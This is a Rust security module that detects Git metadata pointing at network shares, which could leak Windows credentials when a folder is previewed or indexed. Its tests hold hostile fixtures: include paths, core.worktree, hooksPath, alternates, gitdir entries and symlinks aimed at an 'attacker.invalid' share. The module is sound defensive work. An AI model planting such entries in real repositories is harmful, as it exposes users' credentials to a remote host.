//! Containment of Git metadata that points off the machine (security review
//! WI-604).
//!
//! Opening a path on a network share (`\\host\share`, `//host/share`) or in
//! a device namespace makes Windows connect and authenticate as the user, so
//! a folder that came from an archive or a copy (a clone never does this)
//! could leak the user's credentials just by being previewed, registered or
//! indexed. Git follows many paths taken from repository content: a `.git`
//! file or link, `gitdir:`/`commondir` chains, `objects/info/alternates`,
//! config `include.path`/`includeIf.*.path`, `core.worktree`,
//! `core.excludesFile`, `core.attributesFile`, `core.hooksPath`, and any
//! symbolic link or junction inside the Git directory.
//!
//! Everything here is vetted *without* opening a path that is not yet known
//! to be local: links are resolved by reading their targets
//! ([`resolve_links_locally`]), never by following them.
//! A checkout that the user placed on a share themselves is out of scope.

use std::collections::VecDeque;
use std::ffi::OsString;
use std::path::{Component, Path, PathBuf};

use crate::wrongstack_paths::node_resolve;

const MAX_LINK_HOPS: usize = 40;
const MAX_CHAIN: usize = 5;
const MAX_INCLUDE_DEPTH: usize = 10;
const MAX_GIT_DIR_ENTRIES: usize = 1_000_000;

fn is_double_slash(s: &str) -> bool {
    let b = s.as_bytes();
    b.len() >= 2 && matches!(b[0], b'\\' | b'/') && matches!(b[1], b'\\' | b'/')
}

/// The local spelling of a path, or `Err(path)` when it names a network
/// share or a device. Verbatim drive paths (`\\?\C:\x`, `\??\C:\x` as
/// junction targets read back) are local.
pub fn local_form(raw: &str) -> Result<String, String> {
    let s = match raw.strip_prefix(r"\??\") {
        Some(r) => format!(r"\\?\{r}"),
        None => raw.to_string(),
    };
    for pre in [r"\\?\", r"\\.\", "//?/", "//./"] {
        if let Some(rest) = s.strip_prefix(pre) {
            let b = rest.as_bytes();
            if b.len() >= 2 && b[0].is_ascii_alphabetic() && b[1] == b':' {
                return Ok(rest.to_string());
            }
            return Err(s);
        }
    }
    if is_double_slash(&s) { Err(s) } else { Ok(s) }
}

/// Resolve every symbolic link and junction in the absolute path `p` by
/// reading link targets, never by opening one. `Err(target)` when a link
/// (or `p` itself) leads to a share or device, or after too many hops.
/// Components that do not exist are kept as given.
pub fn resolve_links_locally(p: &Path) -> Result<PathBuf, String> {
    let start = local_form(&p.to_string_lossy())?;
    let mut cur = PathBuf::new();
    let mut rest: VecDeque<OsString> = VecDeque::new();
    push_front(&mut cur, &mut rest, Path::new(&start), true);
    let mut hops = 0;
    while let Some(c) = rest.pop_front() {
        if c == "." {
            continue;
        }
        if c == ".." {
            cur.pop();
            continue;
        }
        let cand = cur.join(&c);
        match std::fs::symlink_metadata(&cand) {
            Ok(m) if m.file_type().is_symlink() => {
                hops += 1;
                if hops > MAX_LINK_HOPS {
                    return Err(format!("{} (too many links)", cand.display()));
                }
                let target = std::fs::read_link(&cand)
                    .map_err(|e| format!("{} (unreadable link: {e})", cand.display()))?;
                let target = local_form(&target.to_string_lossy())?;
                let t = Path::new(&target);
                let absolute = t.is_absolute() || t.has_root();
                push_front(&mut cur, &mut rest, t, absolute);
            }
            _ => cur = cand,
        }
    }
    Ok(cur)
}

/// Queue the components of `t` before `rest`; an absolute `t` restarts from
/// its root (a rooted path without a drive keeps the current drive).
fn push_front(cur: &mut PathBuf, rest: &mut VecDeque<OsString>, t: &Path, absolute: bool) {
    let mut names = Vec::new();
    let mut root = PathBuf::new();
    for comp in t.components() {
        match comp {
            Component::Prefix(p) => root.push(p.as_os_str()),
            Component::RootDir => root.push(std::path::MAIN_SEPARATOR_STR),
            Component::CurDir => names.push(OsString::from(".")),
            Component::ParentDir => names.push(OsString::from("..")),
            Component::Normal(n) => names.push(n.to_os_string()),
        }
    }
    if absolute {
        if root.as_os_str().len() <= 1 {
            // `\x` on Windows: same drive as the current path.
            let drive = cur.components().next().and_then(|c| match c {
                Component::Prefix(p) => Some(PathBuf::from(p.as_os_str())),
                _ => None,
            });
            if let Some(d) = drive {
                root = d.join(std::path::MAIN_SEPARATOR_STR);
            }
        }
        *cur = root;
    }
    for n in names.into_iter().rev() {
        rest.push_front(n);
    }
}

/// A path value from Git metadata, relative to `base`: its local, link-free
/// form, or `Err` when it (or a link on the way) is remote.
fn vet_value(value: &str, base: &Path) -> Result<PathBuf, String> {
    let v = local_form(value.trim())?;
    let p = Path::new(&v);
    let joined = if p.is_absolute() || p.has_root() {
        p.to_path_buf()
    } else {
        base.join(p)
    };
    resolve_links_locally(&node_resolve(&joined))
}

/// Read a `.git` entry: the Git directory it designates (links resolved),
/// `Ok(None)` when it is neither a directory nor a `gitdir:` file.
fn git_dir_of(dot_git: &Path) -> Result<Option<PathBuf>, String> {
    let real = resolve_links_locally(dot_git)?;
    let Ok(m) = std::fs::metadata(&real) else {
        return Ok(None);
    };
    if m.is_dir() {
        return Ok(Some(real));
    }
    let Ok(text) = std::fs::read_to_string(&real) else {
        return Ok(None);
    };
    let line = text.trim();
    match line.get(..7) {
        Some(p) if p.eq_ignore_ascii_case("gitdir:") => {
            let rest = line[7..].trim();
            if rest.is_empty() {
                return Ok(None);
            }
            let base = dot_git.parent().unwrap_or(Path::new("."));
            vet_value(rest, base).map(Some)
        }
        _ => Ok(None),
    }
}

/// The nearest `.git` entry Git would use for `checkout`.
fn nearest_dot_git(checkout: &Path) -> Option<PathBuf> {
    let mut dir = Some(checkout);
    while let Some(d) = dir {
        let dot_git = d.join(".git");
        if std::fs::symlink_metadata(&dot_git).is_ok() {
            return Some(dot_git);
        }
        dir = d.parent();
    }
    None
}

/// Vet the Git metadata of `checkout`. `deep` also covers what `git`
/// itself reads (alternates, config paths, links inside the Git directory);
/// shallow covers what `gitIdentityRoot` reads (`.git`, `gitdir`,
/// `commondir`). `Err(target)` names the first remote reference.
pub fn vet_checkout(checkout: &Path, deep: bool) -> Result<(), String> {
    if local_form(&checkout.to_string_lossy()).is_err() {
        return Ok(());
    }
    let Some(dot_git) = nearest_dot_git(checkout) else {
        return Ok(());
    };
    match git_dir_of(&dot_git)? {
        Some(gd) => vet_git_dir(&gd, deep, 0),
        None => Ok(()),
    }
}

fn vet_git_dir(gd: &Path, deep: bool, depth: usize) -> Result<(), String> {
    if depth > MAX_CHAIN {
        return Err(format!("{} (commondir chain too long)", gd.display()));
    }
    if let Ok(text) = std::fs::read_to_string(gd.join("commondir")) {
        let common = vet_value(text.trim(), gd)?;
        vet_git_dir(&common, deep, depth + 1)?;
    }
    if deep {
        vet_tree_links(gd)?;
        vet_alternates(&gd.join("objects"), 0)?;
        for f in ["config", "config.worktree"] {
            vet_config(&gd.join(f), 0)?;
        }
    }
    Ok(())
}

/// Every link inside the Git directory must stay local. Links are not
/// descended into (their target directories are vetted by resolution).
fn vet_tree_links(gd: &Path) -> Result<(), String> {
    let mut stack = vec![gd.to_path_buf()];
    let mut seen = 0usize;
    while let Some(dir) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for e in entries.flatten() {
            seen += 1;
            if seen > MAX_GIT_DIR_ENTRIES {
                return Err(format!("{} (too many entries to vet)", gd.display()));
            }
            let Ok(ft) = e.file_type() else { continue };
            if ft.is_symlink() {
                resolve_links_locally(&e.path())?;
            } else if ft.is_dir() {
                stack.push(e.path());
            }
        }
    }
    Ok(())
}

fn unquote(v: &str) -> String {
    let mut out = String::new();
    let mut chars = v.chars();
    while let Some(c) = chars.next() {
        match c {
            '"' => {}
            '\\' => {
                if let Some(n) = chars.next() {
                    out.push(match n {
                        'n' => '\n',
                        't' => '\t',
                        other => other,
                    });
                }
            }
            other => out.push(other),
        }
    }
    out
}

/// `objects/info/alternates`, recursively (Git follows chains too).
fn vet_alternates(objects: &Path, depth: usize) -> Result<(), String> {
    let Ok(text) = std::fs::read_to_string(objects.join("info").join("alternates")) else {
        return Ok(());
    };
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let alt = vet_value(&unquote(line), objects)?;
        if depth < MAX_CHAIN {
            vet_alternates(&alt, depth + 1)?;
        } else {
            return Err(format!("{} (alternates chain too long)", alt.display()));
        }
    }
    Ok(())
}

/// Config keys whose values are paths Git opens during the commands
/// WrongIndex or WrongStack run.
fn vet_config(file: &Path, depth: usize) -> Result<(), String> {
    let Ok(text) = std::fs::read_to_string(file) else {
        return Ok(());
    };
    let base = file.parent().unwrap_or(Path::new("."));
    let mut section = String::new();
    for raw in text.lines() {
        let mut line = raw.trim();
        if line.starts_with('[') {
            let end = line.find(']').unwrap_or(line.len());
            let header = &line[1..end];
            section = header
                .split(|c: char| c.is_whitespace() || c == '.' || c == '"')
                .next()
                .unwrap_or("")
                .to_ascii_lowercase();
            line = line[(end + 1).min(line.len())..].trim();
            if line.is_empty() {
                continue;
            }
        }
        if line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim().to_ascii_lowercase();
        let value = unquote(value.trim());
        match (section.as_str(), key.as_str()) {
            ("include" | "includeif", "path") => {
                let target = match value.strip_prefix("~/").or(value.strip_prefix("~\\")) {
                    Some(r) => match home() {
                        Some(h) => h.join(r).to_string_lossy().into_owned(),
                        None => continue,
                    },
                    None => value.clone(),
                };
                let p = vet_value(&target, base)?;
                if depth < MAX_INCLUDE_DEPTH {
                    vet_config(&p, depth + 1)?;
                }
            }
            ("core", "worktree" | "excludesfile" | "attributesfile" | "hookspath") => {
                if !value.is_empty() && !value.starts_with('~') {
                    vet_value(&value, base)?;
                } else {
                    local_form(&value)?;
                }
            }
            _ => {}
        }
    }
    Ok(())
}

fn home() -> Option<PathBuf> {
    std::env::var_os("USERPROFILE")
        .or_else(|| std::env::var_os("HOME"))
        .map(PathBuf::from)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn local_form_classifies_shares_devices_and_verbatim_drives() {
        assert!(local_form(r"\\host\s").is_err());
        assert!(local_form("//host/s").is_err());
        assert!(local_form(r"\\?\UNC\host\s").is_err());
        assert!(local_form(r"\??\UNC\host\s").is_err());
        assert!(local_form(r"\\.\pipe\x").is_err());
        assert!(local_form(r"\\?\Volume{0}\x").is_err());
        assert_eq!(local_form(r"\\?\C:\x").unwrap(), r"C:\x");
        assert_eq!(local_form(r"\??\C:\x").unwrap(), r"C:\x");
        assert_eq!(local_form(r"C:\x").unwrap(), r"C:\x");
        assert_eq!(local_form("../x").unwrap(), "../x");
    }

    fn checkout() -> (tempfile::TempDir, PathBuf, PathBuf) {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().join("p");
        let gd = root.join(".git");
        std::fs::create_dir_all(gd.join("objects").join("info")).unwrap();
        std::fs::write(gd.join("HEAD"), "ref: refs/heads/main\n").unwrap();
        (tmp, root, gd)
    }

    #[test]
    fn an_ordinary_git_directory_passes() {
        let (_t, root, gd) = checkout();
        std::fs::write(
            gd.join("config"),
            "[core]\n\tbare = false\n[remote \"origin\"]\n\turl = //server/repos/x.git\n",
        )
        .unwrap();
        assert_eq!(vet_checkout(&root, true), Ok(()));
    }

    #[test]
    fn remote_references_in_git_metadata_are_found_without_following_them() {
        let cases: &[(&str, &str)] = &[
            ("config", "[include]\n\tpath = //attacker.invalid/s/c\n"),
            (
                "config",
                "[includeIf \"gitdir:~/\"]\n\tpath = \"\\\\\\\\attacker.invalid\\\\s\"\n",
            ),
            ("config", "[core]\n\tworktree = //attacker.invalid/w\n"),
            ("config", "[core]\n\texcludesFile = //attacker.invalid/x\n"),
            ("config", "[core] attributesfile = //attacker.invalid/a\n"),
            (
                "config.worktree",
                "[core]\n\thooksPath = //attacker.invalid/h\n",
            ),
            ("objects/info/alternates", "//attacker.invalid/objects\n"),
            ("commondir", "//attacker.invalid/common\n"),
        ];
        for (file, body) in cases {
            let (_t, root, gd) = checkout();
            std::fs::write(gd.join(file), body).unwrap();
            let r = vet_checkout(&root, true);
            assert!(
                matches!(&r, Err(t) if t.contains("attacker.invalid")),
                "{file}: {r:?}"
            );
        }
    }

    #[test]
    fn a_local_include_is_followed_and_vetted() {
        let (_t, root, gd) = checkout();
        std::fs::write(gd.join("config"), "[include]\n\tpath = extra.cfg\n").unwrap();
        std::fs::write(
            gd.join("extra.cfg"),
            "[core]\n\tworktree = //attacker.invalid/w\n",
        )
        .unwrap();
        assert!(vet_checkout(&root, true).is_err());
    }

    #[test]
    fn gitdir_file_chain_is_vetted_shallow_and_deep() {
        let (_t, root, _gd) = checkout();
        let wt = root.parent().unwrap().join("wt");
        std::fs::create_dir_all(&wt).unwrap();
        std::fs::write(
            wt.join(".git"),
            "gitdir: //attacker.invalid/s/worktrees/y\n",
        )
        .unwrap();
        assert!(vet_checkout(&wt, false).is_err());
        std::fs::write(wt.join(".git"), "gitdir: ../p/.git\n").unwrap();
        assert_eq!(vet_checkout(&wt, false), Ok(()));
    }

    /// No false alarms on real checkouts: every directory listed in
    /// `WRONGINDEX_VET_DIRS` (`;`-separated) must pass the deep vet.
    #[test]
    #[ignore = "needs WRONGINDEX_VET_DIRS"]
    fn real_checkouts_pass() {
        let dirs = std::env::var("WRONGINDEX_VET_DIRS").expect("WRONGINDEX_VET_DIRS");
        let mut n = 0;
        for d in dirs.split(';').filter(|d| !d.trim().is_empty()) {
            let started = std::time::Instant::now();
            assert_eq!(vet_checkout(Path::new(d.trim()), true), Ok(()), "{d}");
            eprintln!("{d}: ok in {:?}", started.elapsed());
            n += 1;
        }
        assert!(n > 0);
    }

    /// Links need either Developer Mode or elevation on Windows; the case is
    /// skipped (and says so) when they cannot be created.
    #[cfg(windows)]
    #[test]
    fn links_to_shares_are_read_not_followed() {
        let (_t, root, gd) = checkout();
        let made = |link: &Path, target: &str, dir: bool| {
            let r = if dir {
                std::os::windows::fs::symlink_dir(target, link)
            } else {
                std::os::windows::fs::symlink_file(target, link)
            };
            r.is_ok()
        };
        // A link inside the Git directory.
        if !made(&gd.join("info"), r"\\attacker.invalid\s\info", true) {
            eprintln!("SKIPPED: cannot create symbolic links here");
            return;
        }
        assert!(vet_checkout(&root, true).is_err());
        assert_eq!(
            vet_checkout(&root, false),
            Ok(()),
            "shallow ignores the tree"
        );
        // `.git` itself a link.
        let other = root.parent().unwrap().join("q");
        std::fs::create_dir_all(&other).unwrap();
        assert!(made(
            &other.join(".git"),
            r"\\attacker.invalid\s\.git",
            true
        ));
        assert!(vet_checkout(&other, false).is_err());
        // A local link chain ending at a share.
        let hop = root.parent().unwrap().join("hop");
        assert!(made(&hop, r"\\attacker.invalid\s", true));
        let r = resolve_links_locally(&hop.join("x").join("y"));
        assert!(
            matches!(&r, Err(t) if t.contains("attacker.invalid")),
            "{r:?}"
        );
        // A local link chain staying local.
        let local = root.parent().unwrap().join("local");
        assert!(made(&local, &gd.to_string_lossy(), true));
        assert_eq!(
            resolve_links_locally(&local.join("HEAD")).unwrap(),
            gd.join("HEAD")
        );
    }
}
